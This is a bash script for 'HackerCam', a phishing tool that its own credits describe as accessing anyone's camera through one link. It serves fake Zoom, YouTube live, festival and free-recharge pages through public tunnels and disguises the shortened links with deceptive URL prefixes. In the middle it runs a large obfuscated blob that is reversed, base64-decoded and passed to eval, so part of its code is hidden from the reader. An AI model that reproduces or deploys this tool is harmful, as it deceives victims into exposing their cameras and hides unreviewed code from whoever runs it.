#!/bin/bash

# HackerCam
# Version    : 1.0.0
# Author     : k4itrun
# Github     : https://github.com/k4itrun
# Email      : tsx@billoneta.xyz
# Credits    : LinuxChoice & techchipnet/CamPhish
# Date       : 20-10-2023
# License    : MIT
# Copyright  : k4itrun (2023-202*)
# Language   : Shell

# Utils Colors
black="\033[0;30m"
red="\033[0;31m"
orange="\033[0;33m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
bwhite="\033[1;37m"
gray="\033[0;90m"
bggray="\033[1;90m"
lred="\033[1;31m"
lgreen="\033[1;32m"
lyellow="\033[1;33m"
lblue="\033[1;34m"
lpurple="\033[1;35m"
lcyan="\033[1;36m"
violate="\033[1;37m"
nc="\033[00m"


# Useful output snippets
success="${yellow}[${bwhite}√${yellow}] ${green}"
error="${blue}[${bwhite}!${blue}] ${red}"
info="${yellow}[${bwhite}+${yellow}] ${lyellow}"
info2="${green}[${bwhite}•${green}] ${bggray}"
ask="${green}[${bwhite}?${green}] ${bblue}"

# version
version="1.0.0"

cwd=`pwd`
tunneler_dir="$HOME/.tunneler"

# Logo
logo="
${lgreen} 
${green} ██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░░█████╗░░█████╗░███╗░░░███╗
${lgreen} ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░████║
${green} ███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝██║░░╚═╝███████║██╔████╔██║
${lgreen} ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗██║░░██╗██╔══██║██║╚██╔╝██║
${green} ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║╚█████╔╝██║░░██║██║░╚═╝░██║
${lgreen} ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
${green}                                 ${red}[v${version}]
${lgreen}                              ${red}[By k4itrun]
"

loclx_help="
${info}Steps: ${nc}
${green}[${yellow}1${green}] ${blue}Go to ${green}https://localxpose.io
${green}[${yellow}2${green}] ${blue}Create an account 
${green}[${yellow}3${green}] ${blue}Login to your account
${green}[${yellow}4${green}] ${yellow}Visit ${green}https://localxpose.io/dashboard/access ${yellow}and copy your authtoken
"

# Verify Sudo Privileges
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if macOS or Termux
termux=false
brew=false
cloudflared=false
loclx=false
cf_command="$tunneler_dir/cloudflared"
loclx_command="$tunneler_dir/loclx"
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
    cf_command="termux-chroot $tunneler_dir/cloudflared"
    loclx_command="termux-chroot $tunneler_dir/loclx"
fi
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
        cf_command="cloudflared"
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
        loclx_command="localxpose"
    fi
fi

ch_prompt="\n${red}Hacker${nc}@${red}Cam ${lgreen}$ ${nc}"

# Terminate any running instances of the required packages
killer() {
    for process in php wget curl unzip cloudflared loclx localxpose; do
        if pidof "$process"  > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Verify offline status
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}


# Apply template
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
    netcheck
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
        fi
    fi
}


# Prevent Ctrl+C
stty -echoctl

# Detect User Interrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

echo -e "\n${info}Please Wait!...\n${nc}"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp="";x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp");
eval "$N0q$x$Hc2$rQW"

# Hacker-Cam License
: '
                                    MIT License
                        Copyright (c) 2023-202* k4itrun

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
'

# Working Directory
if [ -z "$DIRECTORY" ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Pictures ]; then
                cd /sdcard && mkdir Pictures
            fi
            FOL="/sdcard/Pictures"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi

# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v apk > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v pacman > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done

# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Region for LOCLX
if [ -z $REGION ]; then
    exit 1;
fi

# Install tunneler binaries
if $brew; then
    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
    ! $loclx && brew install localxpose
fi

# Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Set subdomain for loclx
if [ -z $SUBDOMAIN ]; then
    exit 1;
fi

local_url="127.0.0.1:${PORT}"

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done


# Download Tunnels
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
if ! [[ -f $tunneler_dir/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
        sleep 3
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
    else
        echo -e "${error}Device architecture unknown. Download cloudflared/loclx manually!"
        sleep 3
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi



# Check for update new
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/k4itrun/hackercam/refs/heads/main/.github/VERSION.md`
    else
        git_ver=$version
    fi
fi

if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/k4itrun/hackercam/refs/heads/main/CHANGELOG.md)
    clear
    echo -e "$logo"
    echo -e "${info}HackerCam has a new update available!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update ${red}HackerCam${bblue} to the most recent version??${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf HackerCam HackerCam && git clone https://github.com/k4itrun/hackercam
            echo -e "\n${success}HackerCam updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Loclx authentication token
if ! [[ -e "$HOME/.localxpose/.access" ]]; then # If the command "$loclx_command account status" returns an error.
    for try in 1 2; do
        echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$ch_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$loclx_help"
            sleep 4
        else
            if ! [ -d "$HOME/.localxpose" ]; then
                mkdir "$HOME/.localxpose"
            fi
            echo -n "$authtoken" > $HOME/.localxpose/.access
            sleep 1
            break
        fi
    done
fi


# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Please select an option:

${lgreen}[${white}1${lgreen}] ${bblue}Online Meeting
${lgreen}[${white}2${lgreen}] ${bblue}Live Streaming Youtube
${lgreen}[${white}3${lgreen}] ${bblue}Show Festival
${lgreen}[${white}4${lgreen}] ${bblue}Jio Recharge
${lgreen}[${white}d${lgreen}] ${bblue}Change the image Directory ${white}(${bblue}current: ${red}${FOL}${white})
${lgreen}[${white}p${lgreen}] ${bblue}Change the default Port ${white}(${bblue}current: ${red}${PORT}${white})
${lgreen}[${white}x${lgreen}] ${bblue}Credits
${lgreen}[${white}m${lgreen}] ${bblue}See More tools
${lgreen}[${white}0${lgreen}] ${bblue}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "$ch_prompt"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="meeting"
        mask="https://join-zoom-online-meeting"
        break
    elif echo $option | grep -q "2"; then
        dir="ytlive"
        echo -e "\n${ask}Enter youtube video ID:${blue}"
        printf "$ch_prompt"
        read vid_id
        mask="https://watch-youtube-videos-live"
        break
    elif echo $option | grep -q "3"; then
        dir="festival"
        echo -e "\n${ask}Enter festival name ${white}(${bblue}Current: ${green}birthday${white}):${blue}"
        printf "$ch_prompt"
        read fest_name
        mask="https://best-wishes-to-you"
        break
    elif echo $option | grep -q "4"; then
         dir="recharge"
        mask="https://free-399rs-jio-recharge"
        break
    elif echo $option | grep -q "p"; then
        echo -e "\n${ask}Please enter the port:${bblue}"
        printf "$ch_prompt"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            local_url="127.0.0.1:${PORT}"
            echo -e "\n${success}The port has been changed to ${blue}${PORT}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}The port is invalid!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        echo -e "\n${ask}Please enter the directory:${bblue}"
        printf "$ch_prompt"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}The specified directory is invalid and cannot be used!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}The directory has been changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "
$red[ToolName]  ${bwhite}  :[HackerCam]
$red[Version]    ${bwhite} :[${version}]
$red[Description]${bwhite} :[Access anyone's camera using just one link]
$red[Author]     ${bwhite} :[k4itrun]
$red[Github]     ${bwhite} :[https://github.com/k4itrun]
$red[Email]      ${bwhite} :[tsx@billoneta.xyz]"
        printf "$ch_prompt"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/k4itrun/k4itrun#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using HackerCam (star the repository)!\n"
        exit 0
    else
        echo -e "\n${error}Input is invalid, please review and correct!\007"
        OPTION=true
        sleep 1
    fi
done
if ! [ -d "$HOME/.website" ]; then
    mkdir "$HOME/.website"
else
    cd $HOME/.website
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d websites ]; then
    mkdir websites
    netcheck
    wget -q --show-progress "https://github.com/k4itrun/hackercam/releases/download/1.0.0/websites.zip"
    unzip websites.zip -d websites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd websites/$dir
cp -r * "$HOME/.website"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't enabled the hotspot, please do so now!"
    sleep 3
fi
echo -e "\n${info}Starting PHP server on localhost using port ${PORT} [localhost:${PORT}]....\n"
netcheck
php -S "${local_url}" -t "$HOME/.website" > /dev/null 2>&1 &
sleep 2
sleep 1
status=$(curl -s --head -w %{http_code} "${local_url}" -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP could not be started correctly!\n\007"
    killer
    exit 1
else
    echo -e "${success}PHP has been successfully started and ready to use!\n"
fi
echo -e "${info2}Starting tunnelers......\n"
find "$tunneler_dir" -name "*.log" -delete
netcheck
args=""
if [ "$REGION" != false ]; then
    args="--region $REGION"
fi
